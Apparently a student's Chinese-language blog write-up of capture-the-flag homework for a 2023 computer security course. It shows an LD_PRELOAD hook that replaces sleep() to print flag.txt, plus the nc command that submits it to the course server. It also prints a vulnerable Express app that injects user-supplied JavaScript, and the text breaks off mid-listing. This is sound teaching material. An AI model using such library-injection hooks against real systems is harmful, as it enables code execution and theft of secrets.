<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>程式安全 Computer Security 2023 FALL hw0 | BLOG</title><meta name="author" content="Sharkkcode"><meta name="copyright" content="Sharkkcode"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="程式安全 Computer Security 2023 FALL hw0 目前應該是按照我解出的順序整理 writeup 。  加簽路途中經過的 XX 小徑        去程 回程   HW0, Baby Hook, 201nc edu-ctf.zoolab.org 10002  會拿到一個壓縮檔 hw0-pwn_92b26057bc6668d5.zip ，解壓縮之後進去可以翻到以下檔案以及資料">
<meta property="og:type" content="article">
<meta property="og:title" content="程式安全 Computer Security 2023 FALL hw0">
<meta property="og:url" content="https://sharkkcode.github.io/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/index.html">
<meta property="og:site_name" content="BLOG">
<meta property="og:description" content="程式安全 Computer Security 2023 FALL hw0 目前應該是按照我解出的順序整理 writeup 。  加簽路途中經過的 XX 小徑        去程 回程   HW0, Baby Hook, 201nc edu-ctf.zoolab.org 10002  會拿到一個壓縮檔 hw0-pwn_92b26057bc6668d5.zip ，解壓縮之後進去可以翻到以下檔案以及資料">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sharkkcode.github.io/img/wall.jpg">
<meta property="article:published_time" content="2023-09-15T10:07:27.000Z">
<meta property="article:modified_time" content="2023-09-17T03:19:14.104Z">
<meta property="article:author" content="Sharkkcode">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sharkkcode.github.io/img/wall.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sharkkcode.github.io/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '程式安全 Computer Security 2023 FALL hw0',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-17 11:19:14'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2445008510937449" crossorigin="anonymous"></script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/catcat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/07/08/About-Sharkkcode/"><span> About</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/09/14/Portfolio/"><span> Portfolio</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/wall.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BLOG</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/07/08/About-Sharkkcode/"><span> About</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/09/14/Portfolio/"><span> Portfolio</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">程式安全 Computer Security 2023 FALL hw0</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-09-15T10:07:27.000Z" title="Created 2023-09-15 18:07:27">2023-09-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-17T03:19:14.104Z" title="Updated 2023-09-17 11:19:14">2023-09-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="程式安全 Computer Security 2023 FALL hw0"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="程式安全-Computer-Security-2023-FALL-hw0"><a href="#程式安全-Computer-Security-2023-FALL-hw0" class="headerlink" title="程式安全 Computer Security 2023 FALL hw0"></a>程式安全 Computer Security 2023 FALL hw0</h1><blockquote>
<p>目前應該是按照我解出的順序整理 writeup 。</p>
</blockquote>
<h1 id="加簽路途中經過的-XX-小徑"><a href="#加簽路途中經過的-XX-小徑" class="headerlink" title="加簽路途中經過的 XX 小徑"></a>加簽路途中經過的 XX 小徑</h1><table>
<thead>
<tr>
<th align="center"><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc8.jpg"></th>
<th align="center"><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc9.jpg"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">去程</td>
<td align="center">回程</td>
</tr>
</tbody></table>
<h1 id="HW0-Baby-Hook-20"><a href="#HW0-Baby-Hook-20" class="headerlink" title="HW0, Baby Hook, 20"></a>HW0, Baby Hook, 20</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc edu-ctf.zoolab.org 10002</span><br></pre></td></tr></table></figure>

<p>會拿到一個壓縮檔 <code>hw0-pwn_92b26057bc6668d5.zip</code> ，解壓縮之後進去可以翻到以下檔案以及資料夾：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc1.png"></p>
<p>這樣看來應該是要把 docker build 起來，所以就直接 build ，並且下 <code>-d</code> 使其可以再背景執行： ( 要先安裝 <code>docker</code> 跟 <code>docker-compose</code> )</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>接下來要做的就是察看 container id 並利用該 id 進入 container 的指令介面。</p>
<p>查看 container id ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>

<p>進入 container 指令介面：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure>

<p>可以在 <code>/home/chal/</code> 底下看到以下檔案資料夾：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc2.png"></p>
<p>看到這種結構大概就知道是跑 <code>run.sh</code> ，這邊直接查看 <code>run.sh</code> ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/chal/</span><br><span class="line"><span class="built_in">timeout</span> 60 python3 main.py</span><br></pre></td></tr></table></figure>

<p>可以看到他執行了 <code>main.py</code> ，那我們就進去看 <code>main.py</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Give me your share object:&#x27;</span>)</span><br><span class="line">    so = base64.b64decode(<span class="built_in">input</span>())</span><br><span class="line">    tmp = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>)</span><br><span class="line">    tmp.write(so)</span><br><span class="line">    os.popen(<span class="string">f&#x27;chmod +x <span class="subst">&#123;tmp.name&#125;</span>&#x27;</span>)</span><br><span class="line">    p = subprocess.Popen(<span class="string">f&#x27;LD_PRELOAD=<span class="subst">&#123;tmp.name&#125;</span> ./chall&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    p.wait()</span><br><span class="line">    tmp.close()</span><br><span class="line">    os.unlink(tmp.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>大概可以看出， <code>main.py</code> 會把 input 用 base64 解碼後存到一個 tmp file ，而該 tmp file 對被當成執行 <code>chall</code> 之前的 <code>LD_PRELOAD</code> 檔案。</p>
<p>到目前為止題意應該很明顯，因為 <code>LD_PRELOAD</code> 有辦法重新定義執行檔所套用的 function 所以主要就是去看執行檔有沒有 call 什麼 function 可以讓我們覆蓋 ( hook? ) 。</p>
<p>這邊題目剛好有附上 <code>chall.c</code> 讓我們方便觀察：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    sleep(<span class="number">0x48763</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You win!! Maybe :)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看來我們只要把 <code>sleep</code> 的功能 hook 掉就好。</p>
<p>到 <code>/tmp/</code> 去撰寫一個 <code>hook.c</code> ( 要去 <code>/tmp/</code> 是因為我們要找一個可以寫入的地方 ) ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> sec)</span> &#123;</span><br><span class="line">        <span class="type">char</span> line[<span class="number">1000</span>];</span><br><span class="line">        FILE *file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, line);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把 <code>hook.c</code> 輸出成 <code>hook.so</code> ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hook.c -o hook.so -shared -fPIC</span><br></pre></td></tr></table></figure>

<p>接下來按照題意想辦法讓遠端的程式可以 hook 到我新改寫的 <code>hook.so</code> 就可以了，實際指令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">base64</span> /tmp/hook.so | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span>) | nc edu-ctf.zoolab.org 10002</span><br></pre></td></tr></table></figure>

<blockquote>
<p>這邊會需要注意到使用 <code>base64</code> 指令時會多出許多 <code>\n</code> 或者是空白，我不是很確定，最保險的做法就是把 <code>\n</code> 跟空白都除掉，因為 base64 字串裡面本來就不會有這兩種字元，而我們送出的字串末尾又要一個 <code>\n</code> ，這件事情可以用 <code>echo</code> 來做到。</p>
</blockquote>
<h1 id="HW0-GUSP-Hub-20"><a href="#HW0-GUSP-Hub-20" class="headerlink" title="HW0, GUSP Hub, 20"></a>HW0, GUSP Hub, 20</h1><p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc5.png"></p>
<p><a target="_blank" rel="noopener" href="http://edu-ctf.zoolab.org:10010/">http://edu-ctf.zoolab.org:10010/</a></p>
<p>稍微看一下網頁的資訊：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc7.png"></p>
<p>這題也有提供網頁的 soure code ，下載下來架構大概如下：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc4.png"></p>
<p>上面的架構中主要是 <code>app.js</code> 說明了大略的前端程式邏輯，可以先看 <code>README.txt</code> 來尋找更多資訊。</p>
<p>其實應該要先架起 docker 來看看的，但是架的時候好像有問題，所以就先跳過。</p>
<p>查看 <code>README.txt</code> ：</p>
<p><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/computersec/cc6.png"></p>
<p>查看 <code>app.js</code> 內容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uuid = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dns&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> browser = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;FLAG&#123;fake_flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randInt</span> = (<span class="params">min, max</span>) =&gt; <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randStr</span> = (<span class="params">length</span>) =&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">Array</span>(length).<span class="title function_">fill</span>(<span class="number">0</span>).<span class="title function_">map</span>(<span class="function">() =&gt;</span> <span class="title function_">randInt</span>(<span class="number">0</span>, <span class="number">0xff</span>))).<span class="title function_">toString</span>(<span class="string">&#x27;base64url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">GUSPServices</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// only allow localhost users to get the flag -- which is the bot</span></span><br><span class="line">    <span class="comment">// bot? see /report handler</span></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">headers</span>[<span class="string">&#x27;give-me-the-flag&#x27;</span>] === <span class="string">&#x27;yes&#x27;</span> &amp;&amp;</span><br><span class="line">        req.<span class="property">ip</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;No flag for you&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:id/:alias&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id, alias &#125; = req.<span class="property">params</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">GUSPServices</span>.<span class="title function_">has</span>(id)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;API not found&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; url, javascript &#125; = <span class="title class_">GUSPServices</span>.<span class="title function_">get</span>(id);</span><br><span class="line">    <span class="title function_">fetch</span>(url + <span class="string">&#x27;/&#x27;</span> + alias, &#123; <span class="attr">redirect</span>: <span class="string">&#x27;manual&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (r.<span class="property">status</span> !== <span class="number">302</span>) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Alias not found&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> originalUrl = r.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Location&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`&lt;script&gt;</span></span><br><span class="line"><span class="string">        const data = <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; id, alias, originalUrl &#125;)&#125;</span>;</span></span><br><span class="line"><span class="string">        window.onload = () =&gt; &#123;</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;javascript ? javascript :</span></span></span><br><span class="line"><span class="subst"><span class="string">                <span class="string">&#x27;window.location.href = data.originalUrl;&#x27;</span></span></span></span><br><span class="line"><span class="subst"><span class="string">            &#125;</span></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;`</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(err.<span class="property">message</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/add-api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>[<span class="string">&#x27;authenticated&#x27;</span>])</span><br><span class="line">        